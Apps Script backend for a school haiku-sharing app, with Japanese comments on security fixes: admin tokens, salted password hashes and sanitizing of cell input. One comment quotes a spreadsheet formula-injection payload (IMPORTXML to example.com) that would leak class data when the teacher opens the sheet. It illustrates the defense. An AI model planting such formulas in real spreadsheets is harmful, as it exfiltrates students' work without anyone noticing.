/**
 * =========================================================================
 * GIGA句会プラザ - バックエンド (GAS)
 * =========================================================================
 */

/**
 * このアプリが使うシートの並び。名前と、新しく作ったときに置く見出し行。
 * ここに足すと、コピーで配ったファイルにも自動でそろう。
 */
var SHEETS_ = [
  { name: '設定',     header: ['お題', '投票状況'], firstRow: ['自由律', '投票受付中'] },
  // J列（10列目）に非表示(ミュート)フラグを隠しデータとして持ちます
  // K列（11列目）は投稿した端末の識別子。マイページで「自分の作品だけ」を
  // 返すときに突き合わせます。児童には見せません。
  { name: '俳句',     header: ['ID', '名前', '投稿日時', '俳句', '上の句', '中の句', '下の句', '得点', '公開名', 'ミュート', '投稿者ID'] },
  { name: 'コメント', header: ['投稿日時', '俳句ID', 'コメント投稿者', 'コメント'] },
  { name: '投票',     header: ['投票日時', '俳句ID', '点数', '投票者ID'] },
];

/**
 * 足りないシートだけを作る。
 *
 * ふつうは 1 枚も足りないことが無いので、その場合はロックを取らずに帰る
 * （40 台が一斉に開く朝に、全員がロック待ちに並ぶのを避けるため）。
 * 先生が誤って 1 枚消したときも、次に開いた人が作り直す。中身は戻らないが、
 * 画面が TypeError で出なくなることは無くなる。
 */
function ensureSheets_(ss) {
  var todo = SHEETS_.filter(function (spec) {
    var sheet = ss.getSheetByName(spec.name);
    return !sheet || sheet.getLastRow() === 0;
  });
  if (!todo.length) return ss;

  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    SHEETS_.forEach(function (spec) {
      var sheet = ss.getSheetByName(spec.name);
      if (sheet && sheet.getLastRow() > 0) return;   // ロック待ちの間に誰かが作っていた
      if (!sheet) sheet = ss.insertSheet(spec.name);
      writeHeader_(sheet, spec);
    });
  } finally {
    lock.releaseLock();
  }
  return ss;
}

/** 見出し行（と、設定シートの初期値）を書く。空のシートにしか使わない。 */
function writeHeader_(sheet, spec) {
  sheet.appendRow(spec.header);
  if (spec.firstRow) sheet.appendRow(spec.firstRow);
  sheet.getRange('A1:K1').setBackground('#f3f4f6');
}

/**
 * シートの作りが SHEETS_ のとおりかを点検する。**直さない。**
 *
 * ⚠️ 見出しがずれていても、勝手に書き換えてはいけない。
 *    ずれているのは中身のほうなので、見出しだけ正しくすると
 *    **間違った列に正しいラベルが付き、事故が見えなくなる。**
 *    直すのは人の仕事。ここは「どこがどうずれているか」を言うだけにする。
 *
 * なぜ要るか: このアプリは列を番号で読み書きしている（得点はH列、ミュートはJ列、
 * 締切時の作者名はI列）。「俳句」シートの前に1列挿されるだけで、
 * マイページに自分の句が出ない・隠した句が広場に戻る・得点が別の列に入る、が
 * **画面に何も出ないまま**起きる。先生が誤字を直しにシートを開くのは想定内の操作なので、
 * 起こりうるものとして扱う。
 *
 * @return {{sheet: string, kind: string, detail: string}[]} 見つかったもの。正常なら空。
 */
function checkSheets_(ss) {
  var found = [];
  SHEETS_.forEach(function (spec) {
    var sheet = ss.getSheetByName(spec.name);
    if (!sheet) {
      found.push({ sheet: spec.name, kind: 'シートが無い', detail: '作り直せませんでした' });
      return;
    }
    if (sheet.getLastRow() === 0) {
      found.push({ sheet: spec.name, kind: '見出しが無い', detail: '1行目が空です' });
      return;
    }

    var width = Math.max(spec.header.length, sheet.getLastColumn());
    if (sheet.getMaxColumns) width = Math.min(width, sheet.getMaxColumns());
    var actual = sheet.getRange(1, 1, 1, width).getValues()[0];
    var cell = function (i) {
      var v = actual[i];
      return v === undefined || v === null ? '' : String(v).trim();
    };

    var wrong = [];
    for (var i = 0; i < spec.header.length; i++) {
      if (cell(i) !== spec.header[i]) wrong.push(i);
    }
    if (wrong.length) {
      var at = wrong[0];
      found.push({
        sheet: spec.name,
        kind: '見出しがちがう',
        detail: (at + 1) + '列目が「' + spec.header[at] + '」のはずが「' + (cell(at) || '空') + '」になっています'
          + (wrong.length > 1 ? '（ほか ' + (wrong.length - 1) + ' 列もずれています）' : ''),
      });
    }

    var extra = [];
    for (var j = spec.header.length; j < width; j++) {
      if (cell(j) !== '') extra.push(cell(j));
    }
    if (extra.length) {
      found.push({
        sheet: spec.name,
        kind: '列が多い',
        detail: (spec.header.length + 1) + '列目から先に「' + extra.join('」「') + '」があります',
      });
    }
  });
  return found;
}

/**
 * スプレッドシートを開いたときに出るメニュー。
 * コンテナバインドのときだけ意味がある（独立スクリプトでは呼ばれない）。
 */
function onOpen(e) {
  try {
    SpreadsheetApp.getUi()
      .createMenu('GIGA句会プラザ')
      .addItem('シートを点検する', 'showSheetCheck')
      .addToUi();
  } catch (err) {
    // ウェブアプリとして動いているときは画面が無い。何もしない。
  }
}

/**
 * 上のメニューから呼ぶ。所見を見せるだけで、何も書き換えない。
 *
 * ⚠️ google.script.run は末尾 `_` の無い関数を誰でも呼べるので、この関数も
 *    児童から呼べる。**先に getUi() を取る**のはそのため。画面が無い文脈
 *    （ウェブアプリ）ではここで例外になり、シートを1枚も読まずに終わる。
 *    なお戻り値は無く、返すのは見出しの並びだけなので、児童の作品や名前は出ない。
 */
function showSheetCheck() {
  var ui = SpreadsheetApp.getUi();   // 画面が無ければ、ここで止まる
  var found = checkSheets_(getDbSpreadsheet());
  var text = found.length
    ? '次のところが、アプリの想定と違います。\n\n'
      + found.map(function (f) { return '・「' + f.sheet + '」' + f.kind + '：' + f.detail; }).join('\n')
      + '\n\n列の並びは変えないでください。得点・ミュート・作者名は列の番号で読み書きしています。'
    : 'シートの作りは想定どおりです。';
  ui.alert('シートの点検', text, ui.ButtonSet.OK);
}

/**
 * 作品を入れる表計算ファイル。
 *
 * ■ いまの配り方（コンテナバインド）
 *   スプレッドシートのコピーを配り、そのファイルにこのスクリプトが束ねられている。
 *   束ねられているファイルがそのまま本体なので、ID も自動生成も要らない。
 *   先生は「どこにできたのか」を探さなくてよく、開いているそのファイルが中身である。
 *
 * ■ 前の配り方（独立スクリプト）で公開済みの学級
 *   script.new で作った独立スクリプトには束ねられたファイルが無く、
 *   getActiveSpreadsheet() は null を返す。その学級では、これまでどおり
 *   スクリプトプロパティの DB_SPREADSHEET_ID を見て、無ければ作る。
 *   **ここを消すと、すでに使っている学級のデータが見えなくなる。**
 */
function getDbSpreadsheet() {
  var bound = null;
  try {
    bound = SpreadsheetApp.getActiveSpreadsheet();
  } catch (e) {
    bound = null;   // 独立スクリプトでは例外になる版がある
  }
  if (bound) return ensureSheets_(bound);

  const props = PropertiesService.getScriptProperties();
  let dbId = props.getProperty('DB_SPREADSHEET_ID');

  if (!dbId) {
    const lock = LockService.getScriptLock();
    try {
      lock.waitLock(30000);
      dbId = props.getProperty('DB_SPREADSHEET_ID');

      if (!dbId) {
        const ss = SpreadsheetApp.create('【自動生成】GIGA句会プラザ_DB');
        dbId = ss.getId();
        props.setProperty('DB_SPREADSHEET_ID', dbId);
        // 合言葉の初期値は置かない。
        // 以前はここで '1234' を入れ、README にもそう書いていた。
        // 変え忘れた学級では、URL を知っている児童が誰でも先生として入れてしまう。
        // 未設定のまま始め、先生が最初に先生用タブを開いたときに決めてもらう
        // （setupAdminPassword）。決めた合言葉はハッシュにして持つ。

        // 新規作成の1枚目は「シート1」のまま残るので、設定に作り替えてから
        // 残りを ensureSheets_ にそろえてもらう。
        const first = ss.getSheets()[0];
        first.setName(SHEETS_[0].name);
        writeHeader_(first, SHEETS_[0]);
        ensureSheets_(ss);
      }
    } catch (e) {
      throw new Error('アクセスが集中しています。少し待ってから再度読み込んでください。');
    } finally {
      lock.releaseLock();
    }
  }
  return SpreadsheetApp.openById(dbId);
}

/**
 * ほかの .html ファイルを外枠（app-shell）に差し込む。
 * GAS は .gs と .html しか置けないので、CSS も JavaScript も .html に包んで持つ。
 */
function include(filename) {
  return HtmlService.createHtmlOutputFromFile(filename).getContent();
}

/**
 * 外枠のファイル名。
 *
 * リポジトリでは app-shell.html という名前で持っている。もとは index.html
 * だったが、それだと GitHub Pages（haiku-meeting.giga-school.com）が
 * **GAS 用のテンプレートをそのまま配ってしまい、白い画面になる**。
 * `<?!= include('app'); ?>` はブラウザには意味が無く、ただ捨てられるためである。
 * いまトップに置いてあるのは導入案内のページで、そちらが index.html。
 *
 * ⚠️ 前の版を貼り付けた学級では、GAS 側のファイル名がまだ `index` のままである。
 *    名前を変えただけで動かなくなると、授業中に画面が出なくなる。
 *    新しい名前を先に探し、無ければ前の名前に落ちる。
 */
var SHELL_FILE_ = 'app-shell';
var SHELL_FILE_LEGACY_ = 'index';

function shellTemplate_() {
  try {
    return HtmlService.createTemplateFromFile(SHELL_FILE_);
  } catch (e) {
    // 貼り付けた版が古く app-shell が無い。前の名前で開く。
    return HtmlService.createTemplateFromFile(SHELL_FILE_LEGACY_);
  }
}

function doGet(e) {
  getDbSpreadsheet();
  const template = shellTemplate_();
  return template.evaluate()
    .setTitle('GIGA句会プラザ')
    // 拡大は禁止しない。maximum-scale=1.0 と user-scalable=no を入れると、
    // 見えづらい子が画面を大きくできなくなる。
    // viewport-fit=cover は、切り欠きのある端末で安全領域を CSS から使うために要る。
    // GAS は画面を iframe で包むため、app-shell.html の <meta> だけでは足りず、ここにも要る。
    .addMetaTag('viewport', 'width=device-width, initial-scale=1.0, viewport-fit=cover')
    .setFaviconUrl('https://drive.google.com/uc?id=14xzbLO7mLg2hy85PBQNnj0lir-gi2Uky.&png');
}

function getSettingsData() {
  const ss = getDbSpreadsheet();
  const sheet = ss.getSheetByName('設定');
  return {
    theme: sheet.getRange('A2').getValue() || '自由律',
    votingStatus: sheet.getRange('B2').getValue() || '投票受付中'
  };
}

/**
 * 広場のデータ。
 *
 * ⚠️ もとは作者の名前（B列）を、投票中かどうかに関係なく全員に返していた。
 *    画面では伏せていたが、開発者ツールを開けば誰の句か分かってしまう。
 *    「画面に出さない」は隠したことにならないので、締め切るまで送らない。
 *
 * @param voterId 投票者の識別子（端末ごと）
 * @param myName  自分の名前。自分の句に投票欄を出さないためだけに使う。
 *                自己申告なので、これで守られるのは事故だけ（なりすましは防げない）。
 */
function getPlazaData(voterId, myName) {
  const ss = getDbSpreadsheet();
  const haikuData = ss.getSheetByName('俳句').getDataRange().getValues().slice(1);
  const commentData = ss.getSheetByName('コメント').getDataRange().getValues().slice(1);
  const voteData = ss.getSheetByName('投票').getDataRange().getValues().slice(1);
  const settings = getSettingsData();

  // 締め切ったあとだけ作者を明かす（I列＝公開名は updateSettings が埋める）
  const revealed = settings.votingStatus === '投票締切';

  const haikus = [];
  haikuData.forEach(row => {
    // J列(インデックス9)がtrueのものはミュートされているので広場には送らない
    const isMuted = row[9] === true || String(row[9]).toUpperCase() === 'TRUE';
    if (!isMuted) {
      haikus.push({
        id: row[0],
        author: revealed ? row[1] : '',
        // 自分の句かどうかだけを真偽値で返す。名前そのものは送らない。
        isMine: !!myName && String(row[1]) === String(myName),
        date: row[2] ? String(row[2]) : '',
        haiku: row[3],
        line1: row[4],
        line2: row[5],
        line3: row[6],
        score: row[7] || 0,
        publicName: row[8] || ''
      });
    }
  });

  const comments = commentData.map(row => ({ haikuId: row[1], commenter: row[2], comment: row[3] }));
  const myVotes = voteData.filter(row => String(row[3]) === String(voterId)).map(row => ({ haikuId: row[1], score: row[2] }));

  return { haikus, comments, myVotes, settings };
}

/**
 * マイページ。自分の作品と、その作品にもらったコメントを返す。
 *
 * ⚠️ もとは名前（B列）だけで絞っていた。google.script.run で呼べる関数は
 *    画面に出ていなくても誰でも呼べるので、開発者ツールから
 *
 *      google.script.run.getMyHaikus('花子')
 *
 *    と打てば、その子の全作品と、その子がもらったコメントまで読めた。
 *    名前は自己申告で、合言葉ではない。
 *
 *    このアプリは「実行するユーザー: 自分（先生）」で配る作りなので、
 *    サーバー側で Session.getActiveUser() を見ても空になり、
 *    いま呼んでいるのが誰なのかを Google 側から知る手段がない。
 *    そこで、投票の重複判定にもともと使っている**端末ごとの識別子**
 *    （投票者ID／localStorage の giga_voter_id）を投稿時にも K列 に残し、
 *    それが一致する行だけを返すことにした。
 *    識別子は自分の端末の中にしかないので、他人の分は打ちようがない。
 *
 *    完全ではない。同じ端末を別の子が使えば見えるし、端末を替えたり
 *    ブラウザの記録を消したりすると自分の分も見えなくなる。
 *    「他人の名前を打てば読める」を無くすための、GAS でできる線引き。
 *
 * @param authorId 端末ごとの識別子（投票に使っているものと同じ）
 */
function getMyHaikus(authorId) {
  if (!authorId) return [];

  const ss = getDbSpreadsheet();
  const sheets = ss.getSheets();
  const myHaikus = [];

  const commentSheetsData = [];
  sheets.filter(s => s.getName().startsWith('コメント')).forEach(s => {
    commentSheetsData.push(...s.getDataRange().getValues().slice(1));
  });

  const haikuSheets = sheets.filter(s => s.getName().startsWith('俳句'))
    .map(sheet => ({ sheet: sheet, rows: sheet.getDataRange().getValues().slice(1) }));

  // この端末が実際に名乗ってきた名前を集める（K列が一致する行の B列）。
  const myNames = {};
  haikuSheets.forEach(entry => {
    entry.rows.forEach(row => {
      if (row[10] && String(row[10]) === String(authorId)) myNames[String(row[1])] = true;
    });
  });

  const isMine = (row) => {
    // K列がある行は、識別子が合ったときだけ自分のもの。
    if (row[10]) return String(row[10]) === String(authorId);
    // K列を足す前に投稿された古い行には識別子が無い。名前だけで返すと元の穴に
    // 戻るので、「この端末がその名前で実際に投稿している」ことを確かめてから見せる。
    return !!myNames[String(row[1])];
  };

  haikuSheets.forEach(entry => {
    const sheet = entry.sheet;
    entry.rows.filter(isMine).forEach(row => {
      const haikuId = row[0];
      const comments = commentSheetsData.filter(c => c[1] === haikuId).map(c => ({ commenter: c[2], comment: c[3] }));
      myHaikus.push({
        id: haikuId,
        kukaiName: sheet.getName() === '俳句' ? '【現在の句会】' : `【過去】${sheet.getName().replace('俳句_', '')}`,
        haiku: row[3],
        score: row[7] || 0,
        comments: comments
      });
    });
  });
  return myHaikus;
}

function getArchiveList() {
  const ss = getDbSpreadsheet();
  return ss.getSheets().map(s => s.getName()).filter(name => name.startsWith('俳句_')).sort().reverse();
}

function getArchiveData(sheetName) {
  const ss = getDbSpreadsheet();
  const sheet = ss.getSheetByName(sheetName);
  if (!sheet) return [];
  const data = sheet.getDataRange().getValues().slice(1);
  return data.map(row => ({ haiku: row[3], publicName: row[8] || '（作者非公開）' }));
}

/**
 * 俳句を1句ぶん記録する。
 * @param authorId 端末ごとの識別子。K列に残し、マイページで自分の作品を出すときに使う。
 */
/**
 * 表計算のセルに書く前に、児童の入力を「ただの文字」に落とす。
 *
 * ⚠️ appendRow / setValue に渡した文字列が = + - @ で始まっていると、
 *    Google スプレッドシートはそれを**数式として保存する**。
 *    たとえば上の句に
 *
 *      =IMPORTXML("https://example.com/?"&俳句!D2,"//x")
 *
 *    と書いて投稿されると、**先生がその表計算ファイルを開いた瞬間に**、
 *    学級の句が外のサーバーへ送られる。児童の画面には何も起こらないし、
 *    先生の画面にも「数式が入っている」以外の合図は出ない。
 *    広場に並ぶのは投稿された文字そのものなので、見ても気づけない。
 *
 * 先頭に ' を足すと、その内容は文字として保存される。' は表示にも
 * getValue() の戻り値にも現れないので、句もマイページの突き合わせも
 * これまでどおり動く。
 *
 * タブ・改行で始まる文字列も、貼り付け時に列がずれる形になるので同じ扱いにする。
 */
function safeCellText_(value) {
  if (value === null || value === undefined) return '';
  var text = String(value);
  if (text === '') return '';
  return /^[=+\-@\t\r\n]/.test(text) ? "'" + text : text;
}

function submitHaiku(name, line1, line2, line3, authorId) {
  try {
    const ss = getDbSpreadsheet();
    const sheet = ss.getSheetByName('俳句');
    const haikuText = `${line1} ${line2} ${line3}`;
    const newId = new Date().getTime();
    sheet.appendRow([newId, safeCellText_(name), new Date(), safeCellText_(haikuText),
                     safeCellText_(line1), safeCellText_(line2), safeCellText_(line3),
                     0, "", false, safeCellText_(authorId || '')]);
    return { success: true, name: name };
  } catch (e) { return { success: false, message: e.message }; }
}

function submitVote(haikuId, score, voterId) {
  const lock = LockService.getScriptLock();
  lock.waitLock(10000);
  try {
    const ss = getDbSpreadsheet();
    const voteSheet = ss.getSheetByName('投票');
    const haikuSheet = ss.getSheetByName('俳句');
    
    const voteData = voteSheet.getDataRange().getValues();
    const myVotes = voteData.filter(row => String(row[3]) === String(voterId));

    if (myVotes.some(row => row[2] == score)) throw new Error('その賞は既に投票済みです。');
    if (myVotes.some(row => row[1] == haikuId)) throw new Error('同じ作品には1回しか投票できません。');

    voteSheet.appendRow([new Date(), haikuId, score, safeCellText_(voterId)]);
    
    const haikuData = haikuSheet.getDataRange().getValues();
    for (let i = 1; i < haikuData.length; i++) {
      if (haikuData[i][0] == haikuId) {
        const currentScore = haikuData[i][7] || 0;
        haikuSheet.getRange(i + 1, 8).setValue(currentScore + score);
        break;
      }
    }
    return { success: true };
  } catch (e) { return { success: false, message: e.message }; } finally { lock.releaseLock(); }
}

function submitComment(haikuId, comment, commenterName) {
  try {
    const ss = getDbSpreadsheet();
    ss.getSheetByName('コメント').appendRow([new Date(), haikuId, safeCellText_(commenterName), safeCellText_(comment)]);
    return { success: true };
  } catch (e) { return { success: false, message: e.message }; }
}

// -------------------------------------------------------------------------
// 5. 管理者API
// -------------------------------------------------------------------------
/**
 * ここから下は先生だけが使う処理。
 *
 * ⚠️ google.script.run で呼べる関数は、**画面に出ていなくても誰でも呼べる。**
 *    引数も自由に作れる。以前は下の4つに合言葉の確認がまったく無く、
 *    管理画面のボタンを隠しているだけだった。児童が開発者ツールから
 *
 *      google.script.run.resetKukai()          … 句会を勝手に終わらせる
 *      google.script.run.updateSettings(...)   … 投票を勝手に締め切る
 *                                                （締め切ると全員の名前が出る）
 *      google.script.run.toggleMuteHaiku(...)  … 他人の句を広場から消す
 *      google.script.run.getAdminDashboardData() … 投票中でも全員の名前を取る
 *
 *    と打てば通ってしまう。ボタンを隠すのは対策にならない。
 *
 * 合言葉が合ったときに使い捨ての合鍵（トークン）を渡し、
 * 以降の操作はその合鍵をサーバー側で照合する形にした。
 * 合鍵は CacheService に置く（上限の6時間。授業1コマには十分で、
 * 放っておけば自然に切れる）。
 */
var ADMIN_TOKEN_PREFIX_ = 'admin_token_';
var ADMIN_TOKEN_SECONDS_ = 6 * 60 * 60;   // CacheService の上限

function issueAdminToken_() {
  var token = Utilities.getUuid();
  CacheService.getScriptCache().put(ADMIN_TOKEN_PREFIX_ + token, '1', ADMIN_TOKEN_SECONDS_);
  return token;
}

function requireAdmin_(token) {
  if (!token || CacheService.getScriptCache().get(ADMIN_TOKEN_PREFIX_ + token) !== '1') {
    throw new Error('先生として確認できませんでした。もう一度ログインしてください。');
  }
}

/**
 * 合言葉の持ち方。
 *
 * ⚠️ もとはスクリプトプロパティ ADMIN_PASSWORD に**そのままの文字**で入れていた。
 *    しかも初期値が '1234' で、README にもそう書いてあった。
 *    ・変え忘れた学級では、URL を知っている児童が誰でも先生用画面に入れる
 *    ・スプレッドシートや GAS を共同編集できる人には、合言葉がそのまま読める
 *
 *    いまは SHA-256 のハッシュだけを持ち、初期値そのものを置かない。
 *    先生がいちばん最初に先生用タブを開いたときに決めてもらう（setupAdminPassword）。
 *    学級ごとの「まぜる文字列」（塩）を混ぜてから digest を取るので、
 *    よくある合言葉の一覧表と照らし合わせる手も通りにくい。
 *
 *    ハッシュは元に戻せない。忘れたときは GAS エディタの
 *    「プロジェクトの設定」＞「スクリプト プロパティ」で ADMIN_PASSWORD_HASH を
 *    消せば、また最初の設定画面から決め直せる。
 */
var ADMIN_HASH_KEY_ = 'ADMIN_PASSWORD_HASH';
var ADMIN_SALT_KEY_ = 'ADMIN_PASSWORD_SALT';
var ADMIN_PASSWORD_MIN_ = 6;   // 4桁だと1秒待たせても総当たりが現実的な範囲に入る

function adminSalt_() {
  const props = PropertiesService.getScriptProperties();
  let salt = props.getProperty(ADMIN_SALT_KEY_);
  if (!salt) {
    salt = Utilities.getUuid();
    props.setProperty(ADMIN_SALT_KEY_, salt);
  }
  return salt;
}

function hashAdminPassword_(password) {
  const bytes = Utilities.computeDigest(
    Utilities.DigestAlgorithm.SHA_256,
    adminSalt_() + ':' + String(password),
    Utilities.Charset.UTF_8
  );
  // computeDigest は符号つきのバイト列（-128〜127）を返す。
  // そのまま繋ぐと桁が揃わないので、1バイトずつ2桁の16進に直す。
  return bytes.map(function (b) { return ('0' + (b & 0xff).toString(16)).slice(-2); }).join('');
}

/**
 * 前の版から引き継いだ平文の ADMIN_PASSWORD があれば、ハッシュに移して平文を消す。
 * すでに使っている学級が、いままでの合言葉のまま入り続けられるようにするため。
 */
function migrateAdminPassword_() {
  const props = PropertiesService.getScriptProperties();
  const plain = props.getProperty('ADMIN_PASSWORD');
  if (!plain) return;
  if (!props.getProperty(ADMIN_HASH_KEY_)) {
    props.setProperty(ADMIN_HASH_KEY_, hashAdminPassword_(plain));
  }
  props.deleteProperty('ADMIN_PASSWORD');
}

function storedAdminHash_() {
  migrateAdminPassword_();
  return PropertiesService.getScriptProperties().getProperty(ADMIN_HASH_KEY_);
}

/** 合言葉がまだ決まっていないか。先生用タブが開いたときに最初に聞く。 */
function getAdminSetupState() {
  return { needsSetup: !storedAdminHash_(), minLength: ADMIN_PASSWORD_MIN_ };
}

/**
 * いちばん最初の1回だけ。合言葉を決めて、そのまま先生として入る。
 * すでに決まっているときは何もしない（あとから来た人が上書きできてはいけない）。
 */
function setupAdminPassword(newPass) {
  const lock = LockService.getScriptLock();
  lock.waitLock(10000);
  try {
    if (storedAdminHash_()) {
      return { success: false, message: 'すでにパスワードが設定されています。入力して入ってください。' };
    }
    if (!newPass || String(newPass).length < ADMIN_PASSWORD_MIN_) {
      return { success: false, message: 'パスワードは' + ADMIN_PASSWORD_MIN_ + '文字以上にしてください。' };
    }
    PropertiesService.getScriptProperties().setProperty(ADMIN_HASH_KEY_, hashAdminPassword_(newPass));
    return { success: true, token: issueAdminToken_(), message: 'パスワードを設定しました。' };
  } finally { lock.releaseLock(); }
}

function checkAdminPassword(password) {
  const stored = storedAdminHash_();
  if (!stored) {
    // まだ決まっていない。合言葉が無い状態で合鍵を出さない。
    return { success: false, needsSetup: true };
  }
  if (stored === hashAdminPassword_(password)) {
    return { success: true, token: issueAdminToken_() };
  }
  // 画面から何度でも試せる。締め出すと児童のいたずらで先生が入れなくなるので、
  // 代わりに1回ごとに待たせて総当たりを割に合わなくする。
  Utilities.sleep(1000);
  return { success: false };
}

function updateSettings(token, theme, status) {
  requireAdmin_(token);
  try {
    const ss = getDbSpreadsheet();

    // 締め切ると、B列（名前）を I列（公開名）へ書き戻して作者を明かす。
    // 「俳句」シートの列がずれていると、**実名が別の列に入り、広場に流れる**。
    // ここだけは進めずに止める。児童の画面はそのまま（投票受付中のまま）動く。
    if (status === '投票締切') {
      const issues = checkSheets_(ss).filter(function (f) { return f.sheet === '俳句'; });
      if (issues.length) {
        return {
          success: false,
          message: '「俳句」シートの列が想定と違うため、締め切りを中止しました。'
            + issues[0].detail
            + '　スプレッドシートの「GIGA句会プラザ」メニュー＞「シートを点検する」で確かめてください。',
        };
      }
    }

    const settingsSheet = ss.getSheetByName('設定');
    const haikuSheet = ss.getSheetByName('俳句');
    settingsSheet.getRange('A2').setValue(safeCellText_(theme));
    settingsSheet.getRange('B2').setValue(status);

    const lastRow = haikuSheet.getLastRow();
    if (lastRow > 1) {
      if (status === '投票締切') {
        const authorNames = haikuSheet.getRange('B2:B' + lastRow).getValues();
        haikuSheet.getRange('I2:I' + lastRow).setValues(authorNames);
      } else {
        haikuSheet.getRange('I2:I' + lastRow).clearContent();
      }
    }
    return { success: true };
  } catch (e) { return { success: false, message: e.message }; }
}

function changeAdminPassword(oldPass, newPass) {
  const props = PropertiesService.getScriptProperties();
  const stored = storedAdminHash_();
  if (!stored) {
    return { success: false, message: 'まだパスワードが設定されていません。' };
  }
  if (stored !== hashAdminPassword_(oldPass)) {
    Utilities.sleep(1000);
    return { success: false, message: '現在のパスワードが違います。' };
  }
  if (!newPass || String(newPass).length < ADMIN_PASSWORD_MIN_) {
    return { success: false, message: 'あたらしいパスワードは' + ADMIN_PASSWORD_MIN_ + '文字以上にしてください。' };
  }
  props.setProperty(ADMIN_HASH_KEY_, hashAdminPassword_(newPass));
  return { success: true, message: 'パスワードを更新しました。' };
}

// ダッシュボード用データの一括取得。作者の本名を含むので先生だけに返す。
function getAdminDashboardData(token) {
  requireAdmin_(token);
  const ss = getDbSpreadsheet();
  const haikuSheet = ss.getSheetByName('俳句');
  const commentSheet = ss.getSheetByName('コメント');
  const voteSheet = ss.getSheetByName('投票');
  
  const haikuData = haikuSheet.getDataRange().getValues().slice(1);
  const haikus = haikuData.map(r => ({
    id: r[0], author: r[1], haiku: r[3], score: r[7]||0, isMuted: r[9] === true || String(r[9]).toUpperCase() === 'TRUE'
  }));
  
  const authors = [...new Set(haikus.map(h => h.author))];
  const commentsCount = Math.max(0, commentSheet.getLastRow() - 1);
  const votesCount = Math.max(0, voteSheet.getLastRow() - 1);
  const settings = getSettingsData();
  
  return {
    haikus: haikus.reverse(), // 新しいものを上に
    stats: { haikuCount: haikus.length, authorCount: authors.length, commentsCount, votesCount },
    settings: settings,
    // シートの作りが想定と違うとき、先生の画面に出す。児童の画面は止めない。
    sheetIssues: checkSheets_(ss)
  };
}

// 不適切コンテンツのワンタップミュート
function toggleMuteHaiku(token, haikuId, muteStatus) {
  requireAdmin_(token);
  try {
    const ss = getDbSpreadsheet();
    const sheet = ss.getSheetByName('俳句');
    const data = sheet.getDataRange().getValues();
    for (let i = 1; i < data.length; i++) {
      if (data[i][0] == haikuId) {
        sheet.getRange(i + 1, 10).setValue(muteStatus); // J列にセット
        return { success: true };
      }
    }
    return { success: false, message: '対象が見つかりませんでした' };
  } catch(e) { return { success: false, message: e.message }; }
}

function resetKukai(token) {
  requireAdmin_(token);
  try {
    const ss = getDbSpreadsheet();
    const timestamp = Utilities.formatDate(new Date(), ss.getSpreadsheetTimeZone(), 'yyyy-MM-dd_HH-mm');
    
    ['俳句', 'コメント', '投票'].forEach(name => {
      const sheet = ss.getSheetByName(name);
      if (sheet) sheet.setName(`${name}_${timestamp}`);
    });

    const s1 = ss.insertSheet('俳句', 1);
    s1.appendRow(['ID', '名前', '投稿日時', '俳句', '上の句', '中の句', '下の句', '得点', '公開名', 'ミュート', '投稿者ID']);
    
    const s2 = ss.insertSheet('コメント', 2);
    s2.appendRow(['投稿日時', '俳句ID', 'コメント投稿者', 'コメント']);
    
    const s3 = ss.insertSheet('投票', 3);
    s3.appendRow(['投票日時', '俳句ID', '点数', '投票者ID']);

    ss.getSheets().forEach(s => {
      if(s.getName() === '俳句' || s.getName() === 'コメント' || s.getName() === '投票') {
        s.getRange('A1:K1').setBackground('#f3f4f6');
      }
    });

    const setSheet = ss.getSheetByName('設定');
    setSheet.getRange('B2').setValue('投票受付中');
    return { success: true, message: '新しい句会の準備が完了しました！' };
  } catch (e) { return { success: false, message: e.message }; }
}
